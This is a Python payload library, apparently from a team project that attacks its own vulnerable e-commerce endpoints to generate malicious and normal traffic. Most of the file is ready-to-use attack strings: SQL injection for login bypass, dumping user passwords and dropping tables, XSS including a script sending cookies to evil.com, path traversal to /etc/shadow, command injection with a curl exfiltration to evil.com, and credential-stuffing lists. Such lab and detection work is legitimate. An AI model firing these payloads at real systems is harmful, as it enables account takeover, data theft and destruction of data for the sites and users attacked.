"""
Attack Payloads Library

Curated payloads targeting the victim e-commerce endpoints.
Each payload list is matched to the exact routes built by Member 3.
"""

# ═══════════════════════════════════════════════════════════════
# SQL INJECTION PAYLOADS
# Targets: POST /api/login, GET /api/products/{id}, GET /api/search,
#           GET /api/orders/{id}
# ═══════════════════════════════════════════════════════════════

SQLI_LOGIN_PAYLOADS = [
    # Classic authentication bypass
    {"username": "admin' OR '1'='1", "password": "anything"},
    {"username": "admin'--", "password": "irrelevant"},
    {"username": "' OR 1=1--", "password": ""},
    {"username": "admin' OR '1'='1'--", "password": "x"},
    {"username": "' UNION SELECT 1,2,3,4,5--", "password": "x"},
    # Blind SQLi
    {"username": "admin' AND 1=1--", "password": "x"},
    {"username": "admin' AND SLEEP(3)--", "password": "x"},
    # Error-based
    {"username": "' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--", "password": "x"},
    {"username": "admin'; DROP TABLE users;--", "password": "x"},
    # Double encoding
    {"username": "admin%27%20OR%20%271%27%3D%271", "password": "x"},
]

SQLI_PRODUCT_ID_PAYLOADS = [
    # UNION-based data exfiltration via /api/products/{id}
    "1 UNION SELECT id,username,password,email,role,NULL,NULL,NULL FROM users--",
    "1 OR 1=1",
    "1; DROP TABLE products;--",
    "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "1 AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8--",
    "-1 OR 1=1",
    "1' OR '1'='1",
    "0 UNION ALL SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--",
]

SQLI_SEARCH_PAYLOADS = [
    # SQLi via /api/search?q=
    "' UNION SELECT id,username,password,email,role,NULL,NULL,NULL FROM users--",
    "laptop' OR '1'='1",
    "'; DROP TABLE products;--",
    "' AND 1=1--",
    "laptop%27%20UNION%20SELECT%201,2,3,4,5,6,7,8--",
    "' OR ''='",
    "1' ORDER BY 8--",
]

SQLI_ORDER_ID_PAYLOADS = [
    # SQLi via /api/orders/{id}
    "1 OR 1=1",
    "1 UNION SELECT id,user_id,total,status,shipping_address,NULL FROM orders--",
    "1; SELECT * FROM users--",
    "-1 OR 1=1",
]


# ═══════════════════════════════════════════════════════════════
# XSS (Cross-Site Scripting) PAYLOADS
# Targets: POST /api/products/{id}/reviews (stored XSS)
#           GET /api/search?q= (reflected XSS)
# ═══════════════════════════════════════════════════════════════

XSS_REVIEW_PAYLOADS = [
    # Stored XSS via product reviews
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<<script>alert('XSS')</script>",
    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "<iframe src='javascript:alert(1)'>",
    "<input onfocus=alert('XSS') autofocus>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<details open ontoggle=alert('XSS')>",
]

XSS_SEARCH_PAYLOADS = [
    # Reflected XSS via search query
    "<script>alert('reflected')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert('XSS')",
    "<svg/onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'-alert(1)-'",
    "<marquee onstart=alert('XSS')>",
]


# ═══════════════════════════════════════════════════════════════
# PATH TRAVERSAL PAYLOADS
# Target: GET /api/download?file=
# ═══════════════════════════════════════════════════════════════

PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "..%c0%af..%c0%afetc/passwd",
    "../../proc/self/environ",
    "../../../var/log/auth.log",
    "..\\..\\..\\boot.ini",
    "../../etc/hosts",
    "../app/config.py",
]


# ═══════════════════════════════════════════════════════════════
# COMMAND INJECTION PAYLOADS
# Target: POST /api/ping  (host field)
# ═══════════════════════════════════════════════════════════════

COMMAND_INJECTION_PAYLOADS = [
    "127.0.0.1; whoami",
    "127.0.0.1; cat /etc/passwd",
    "127.0.0.1 && ls -la /",
    "127.0.0.1 | id",
    "$(whoami)",
    "`id`",
    "127.0.0.1; uname -a",
    "127.0.0.1 & net user",
    "127.0.0.1; curl http://evil.com/exfil?data=$(cat /etc/passwd)",
    "127.0.0.1\nnslookup evil.com",
    "127.0.0.1; echo vulnerable > /tmp/pwned.txt",
    "127.0.0.1 || cat /etc/shadow",
]


# ═══════════════════════════════════════════════════════════════
# CREDENTIAL STUFFING (Anomalous traffic)
# Target: POST /api/login — rapid-fire login attempts
# ═══════════════════════════════════════════════════════════════

COMMON_USERNAMES = [
    "admin", "administrator", "root", "test", "user", "guest",
    "info", "support", "webmaster", "manager", "operator", "demo",
    "sysadmin", "db_admin", "superuser", "backup", "service",
    "api_user", "dev", "staging", "production", "deploy",
]

COMMON_PASSWORDS = [
    "password", "123456", "admin", "password123", "12345678",
    "qwerty", "abc123", "letmein", "welcome", "monkey",
    "dragon", "master", "login", "princess", "football",
    "shadow", "sunshine", "trustno1", "iloveyou", "batman",
    "access", "hello", "charlie", "123456789", "superman",
    "michael", "ashley", "jessica", "passw0rd", "P@ssw0rd",
    "admin123", "root123", "test123", "guest123", "default",
    "changeme", "pass", "1234", "secret", "god",
]


# ═══════════════════════════════════════════════════════════════
# NORMAL TRAFFIC DATA
# Realistic e-commerce browsing patterns
# ═══════════════════════════════════════════════════════════════

NORMAL_SEARCH_TERMS = [
    "laptop", "keyboard", "mouse", "shoes", "t-shirt",
    "coffee maker", "book", "desk lamp", "usb hub", "jacket",
    "python", "running", "denim", "electronics", "home",
]

NORMAL_REVIEW_COMMENTS = [
    "Great product! Exactly what I needed.",
    "Good quality for the price. Would recommend.",
    "Arrived on time, works perfectly.",
    "Decent product. Nothing special but gets the job done.",
    "Love it! Already ordered another one for my friend.",
    "The quality exceeded my expectations. Very happy with this purchase.",
    "Solid build quality. Been using it daily for a week now.",
    "Perfect for everyday use. Comfortable and durable.",
    "Five stars! This is the best one I've ever owned.",
    "Fair product. Slightly smaller than expected but functional.",
]
